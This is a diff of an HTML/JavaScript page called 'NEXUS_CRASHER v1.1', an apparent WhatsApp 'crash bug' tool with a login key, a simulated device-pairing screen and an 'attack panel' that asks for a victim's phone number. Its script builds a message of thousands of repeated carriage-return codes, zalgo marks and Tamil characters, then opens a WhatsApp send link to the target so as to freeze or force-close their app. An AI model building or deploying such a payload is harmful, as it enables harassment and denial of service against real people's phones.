@@ -6,9 +6,9 @@
     <title>NEXUS_CRASHER v1.1 | hanzX</title>
     <style>
         :root {
-            --bg: #0d0208;
-            --panel: #1a0514;
-            --neon: #ff2e63;
+            --bg: #090206;
+            --panel: #160410;
+            --neon: #cc0033; /* Crimson Red */
             --text: #ffffff;
             --sub-text: #8b8b8b;
         }
@@ -16,63 +16,62 @@
         body {
             background-color: var(--bg);
             color: var(--text);
-            font-family: 'Courier New', Courier, monospace;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0;
             overflow-x: hidden;
+            background-image: url('https://rehan271112-ctrl.github.io/nexus-crasher-v1/pattern.png'); /* Pattern dots */
         }
 
-        /* LOGIN SCREEN */
-        #login-screen {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            background: var(--bg);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-
+        /* CARD */
         .card {
             background: var(--panel);
-            width: 85%;
-            max-width: 400px;
-            padding: 25px;
-            border-radius: 12px;
-            border: 1px solid var(--neon);
-            box-shadow: 0 0 20px rgba(255, 46, 99, 0.4);
+            margin: 15px;
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(204, 0, 51, 0.3);
+            box-shadow: 0 0 15px rgba(204, 0, 51, 0.5);
         }
 
+        /* INPUT */
         input, select {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
             background: #250a1f;
             border: 1px solid var(--neon);
-            border-radius: 6px;
+            border-radius: 8px;
             color: white;
             box-sizing: border-box;
             outline: none;
         }
 
+        /* BUTTONS */
         .btn-main {
             width: 100%;
             padding: 15px;
-            background: linear-gradient(45deg, #ff2e63, #a01a3d);
+            background: linear-gradient(45deg, #cc0033, #800000);
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             color: white;
             font-weight: bold;
-            cursor: pointer;
             text-transform: uppercase;
-            box-shadow: 0 0 15px rgba(255, 46, 99, 0.6);
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(204, 0, 51, 0.7);
         }
 
-        /* MAIN APP */
-        .header { padding: 20px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; }
-        .content { padding: 20px; padding-bottom: 100px; }
-        .hidden { display: none !important; }
+        /* PAIRING CODE BOX */
+        .pairing-code {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            border: 2px dashed var(--neon);
+            font-size: 1.8rem;
+            text-align: center;
+            letter-spacing: 7px;
+            font-weight: bold;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+        }
 
         /* NAV BOTTOM */
         .nav-bottom {
@@ -85,83 +84,78 @@
             padding: 15px 0;
             border-top: 1px solid var(--neon);
         }
-        .nav-item { color: var(--sub-text); font-size: 0.7rem; text-align: center; cursor: pointer; }
-        .nav-item.active { color: var(--neon); text-shadow: 0 0 8px var(--neon); font-weight: bold; }
+        .nav-item { color: var(--sub-text); font-size: 0.8rem; text-align: center; cursor: pointer; }
+        .nav-item.active { color: var(--neon); text-shadow: 0 0 8px var(--neon); }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div id="login-screen">
+    <div id="login-screen" style="height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
         <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon); letter-spacing: 5px;">NEXUS_CRASHER</h1>
         <p style="color: var(--sub-text); margin-top: -10px;">VERSION 1.1</p>
-        <div class="card">
-            <label>Access Control:</label>
-            <input type="password" id="access-key" placeholder="Enter Admin Key...">
+        <div class="card" style="width: 80%;">
+            <input type="password" id="access-key" placeholder="Enter Admin Access Key...">
             <button class="btn-main" onclick="handleLogin()">AUTHENTICATE</button>
-            <p id="login-msg" style="color: red; font-size: 0.8rem; margin-top: 10px; text-align: center;"></p>
+            <p id="login-msg" style="color: #ff0000; font-size: 0.8rem; text-align: center; margin-top: 10px;"></p>
         </div>
     </div>
 
     <div id="app-content" class="hidden">
-        <div class="header">
-            <div style="font-weight: bold; color: var(--neon);">[ NEXUS_CRASHER v1.1 ]</div>
-            <div style="font-size: 0.8rem;">Role: <span style="color: #00ff00;">Premium</span></div>
+        <div style="padding: 20px; border-bottom: 1px solid var(--neon); text-align: center;">
+            <div style="font-weight: bold; color: var(--neon); font-size: 1.2rem;">[ NEXUS_CRASHER v1.1 ]</div>
+            <div style="font-size: 0.8rem; color: #00ff00;">Premium Access</div>
         </div>
 
         <div class="content">
-            <div id="page-home">
-                <div class="card" style="border-style: dashed;">
-                    <h3 style="margin: 0;">User: rehan1270</h3>
-                    <p style="color: var(--neon); font-size: 0.9rem;">License: PERMANENT (Nexus Elite)</p>
-                </div>
-                <br>
+            <div id="page-sender">
                 <div class="card">
-                    <p>Total Payload Sent: <span id="count" style="color: var(--neon); font-weight: bold;">0</span></p>
-                    <button class="btn-main" onclick="showPage('whatsapp')">GOTO CONTROL PANEL</button>
-                </div>
-            </div>
-
-            <div id="page-sender" class="hidden">
-                <div class="card" style="text-align: center;">
-                    <h3>DEVICE CONNECTION</h3>
-                    <div id="qr-box" style="background: white; width: 180px; height: 180px; margin: 15px auto; padding: 10px;">
-                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Nexus_Crasher_v1.1_Auth" alt="QR">
-                    </div>
-                    <p id="qr-status" style="font-size: 0.8rem; color: yellow;">Status: Waiting for Peer Link...</p>
-                    <button class="btn-main" style="background: #25d366; box-shadow: 0 0 10px #25d366;" onclick="startConnect()">LINK DEVICE</button>
-                </div>
-            </div>
-
-            <div id="page-whatsapp" class="hidden">
-                <div class="card">
-                    <h3 style="text-align: center;">ATTACK PANEL</h3>
-                    <label>Victim Number (628x):</label>
-                    <input type="number" id="target-num" placeholder="Ex: 62812345678">
+                    <h3>MANAGE SENDER</h3>
+                    <label>Nomor WhatsApp Sender (628x):</label>
+                    <input type="number" id="sender-num" placeholder="Ex: 62812345678">
+                    <button class="btn-main" onclick="getPairingCode()">REQUEST PAIRING CODE</button>
                     
-                    <label>Select Crash Payload:</label>
-                    <select id="payload">
-                        <option value="crash">NEXUS_FORCE_CLOSE (V1.1)</option>
-                        <option value="delay">INVISIBLE_DELAY (LAG)</option>
-                        <option value="blank">UI_SYSTEM_FREEZE</option>
+                    <div id="code-box" class="hidden">
+                        <p style="font-size: 0.8rem; color: var(--sub-text); margin-top: 20px;">Masukkan kode ini di WhatsApp -> Tautkan Perangkat -> Tautkan dengan nomor telepon:</p>
+                        <div class="pairing-code" id="display-code">H6JX-K9LP</div>
+                        <p style="color: yellow; font-size: 0.7rem; text-align: center;">Status: Waiting for Peer Link...</p>
+                    </div>
+                </div>
+                <div class="card" style="padding: 0; overflow: hidden; border-radius: 12px; margin-top: 20px;">
+                    <img src="https://i.ibb.co/h99Yx1F/guts.jpg" style="width: 100%; height: auto;" alt="Anime">
+                    <div style="padding: 10px; font-size: 0.8rem; font-style: italic; color: var(--sub-text);">"In this world, is man's destiny controlled by some transcendental entity or law?"</div>
+                </div>
+            </div>
+
+            <div id="page-attack" class="hidden">
+                <div class="card">
+                    <h3>CONTROL PANEL</h3>
+                    <label>Nomor Target:</label>
+                    <input type="number" id="target-num" placeholder="628xxxxxxx">
+                    
+                    <label>Jenis Payload:</label>
+                    <select id="payload-type">
+                        <option value="crash">NEXUS_V1.1 (FORCE CLOSE)</option>
+                        <option value="zalgo">ZALGO_LAG (FRAME DROP)</option>
+                        <option value="tamil">TAMIL_FREEZE (HEAVY)</option>
                     </select>
                     <br><br>
-                    <button id="attack-btn" class="btn-main" onclick="sendAttack()">EXECUTE ATTACK!</button>
-                    <div id="attack-log" style="font-size: 0.7rem; color: #00ff00; margin-top: 15px; font-style: italic;"></div>
+                    <button id="attack-btn" class="btn-main" onclick="sendHeavyAttack()">EXECUTE ATTACK!</button>
+                    <p id="attack-log" style="font-size: 0.7rem; color: #00ff00; margin-top: 15px; text-align: center;"></p>
                 </div>
             </div>
         </div>
 
         <nav class="nav-bottom">
-            <div class="nav-item active" id="nav-home" onclick="showPage('home')">HOME</div>
-            <div class="nav-item" id="nav-whatsapp" onclick="showPage('whatsapp')">ATTACK</div>
-            <div class="nav-item" id="nav-sender" onclick="showPage('sender')">SENDER</div>
+            <div class="nav-item active" onclick="showPage('sender')">SENDER</div>
+            <div class="nav-item" onclick="showPage('attack')">ATTACK</div>
         </nav>
     </div>
 
     <script>
+        // LOGIKA LOGIN
         function handleLogin() {
-            const key = document.getElementById('access-key').value;
-            if(key === "hanzX" || key === "admin") {
+            if(document.getElementById('access-key').value === "hanzX") {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('app-content').classList.remove('hidden');
             } else {
@@ -169,47 +163,47 @@
             }
         }
 
-        function showPage(page) {
-            document.getElementById('page-home').classList.add('hidden');
-            document.getElementById('page-whatsapp').classList.add('hidden');
+        // NAVIGASI
+        function showPage(p) {
             document.getElementById('page-sender').classList.add('hidden');
-            document.getElementById('page-' + page).classList.remove('hidden');
+            document.getElementById('page-attack').classList.add('hidden');
+            document.getElementById('page-' + p).classList.remove('hidden');
             document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-            document.getElementById('nav-' + page).classList.add('active');
+            event.target.classList.add('active');
         }
 
-        function startConnect() {
-            const status = document.getElementById('qr-status');
-            status.innerText = "Connecting to Nexus Server...";
-            setTimeout(() => {
-                status.style.color = "#00ff00";
-                status.innerText = "Device Linked! Ready to Deploy.";
-                alert("NEXUS_CRASHER v1.1 Linked Successfully!");
-            }, 2000);
+        // LOGIKA PAIRING CODE
+        function getPairingCode() {
+            const num = document.getElementById('sender-num').value;
+            if(!num) return alert("Isi nomor sender dulu cok!");
+            document.getElementById('code-box').classList.remove('hidden');
+            // Simulasi kode pairing acak
+            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+            let code = "";
+            for(let i=0; i<8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
+            document.getElementById('display-code').innerText = code.substring(0,4) + "-" + code.substring(4,8);
         }
 
-        let totalSent = 0;
-        function sendAttack() {
+        // LOGIKA HEAVY ATTACK
+        function sendHeavyAttack() {
             const target = document.getElementById('target-num').value;
             const log = document.getElementById('attack-log');
             const btn = document.getElementById('attack-btn');
 
-            if(!target) return alert("Victim number is required cok!");
+            if(!target) return alert("Victim number required cok!");
 
-            btn.innerText = "INJECTING...";
-            log.innerHTML = "[*] Accessing WhatsApp Mainframe...<br>";
+            btn.innerText = "INJECTING payload...";
+            log.innerText = "[*] Accessing WhatsApp Mainframe...<br>";
             
             setTimeout(() => {
-                log.innerHTML += "[*] Deploying Nexus_Crasher v1.1 Payload...<br>";
+                log.innerText += "[*] Deploying Nexus_Crasher v1.1 Payload...<br>";
                 setTimeout(() => {
-                    log.innerHTML += "[V] ATTACK SUCCESSFULLY DEPLOYED TO " + target;
+                    log.innerText += "[V] ATTACK SENT!";
                     btn.innerText = "EXECUTE ATTACK!";
-                    totalSent++;
-                    document.getElementById('count').innerText = totalSent;
 
-                    // EKSEKUSI BUG KARAKTER
-                    const bugText = encodeURIComponent("%0D".repeat(6000) + " [ NEXUS_CRASHER v1.1 BY hanzX ] ");
-                    window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${bugText}`;
+                    // BUG TEXT: Ribuan Karakter Berat + Zalgo
+                    const heavyBug = encodeURIComponent("%0D".repeat(8000) + "҈҉҈҉҈҉҈҉҈҉" + " ௌௌௌ ".repeat(500) + " [ NEXUS_CRASHER v1.1 BY hanzX ] ");
+                    window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${heavyBug}`;
                 }, 1500);
             }, 1000);
         }
